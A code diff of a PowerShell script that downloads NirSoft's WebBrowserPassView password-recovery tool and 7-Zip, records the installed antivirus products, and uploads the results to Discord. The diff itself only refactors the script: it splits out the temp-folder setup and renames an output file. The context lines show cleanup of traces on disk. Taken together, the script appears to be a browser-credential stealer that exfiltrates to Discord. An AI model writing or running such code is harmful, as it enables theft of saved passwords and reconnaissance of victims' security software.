@@ -1,8 +1,12 @@
 $desktop = ([Environment]::GetFolderPath("Desktop"))
-function Get-Nirsoft {
+
+function CreateTemp{
   cd C:\
   mkdir \temp 
   cd \temp
+  }
+
+function Get-Nirsoft {
   Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
   Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
   Expand-Archive 7z.zip
@@ -89,7 +93,6 @@ Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt
 }
 
 function version-av {
-  cd C:\temp
-  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
-  Upload-Discord -file "C:\Temp\resultat.txt" -text "Anti-spyware version:"
+  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
+  Upload-Discord -file "C:\Temp\AntiSpyware.txt" -text "Anti-spyware version:"
 }
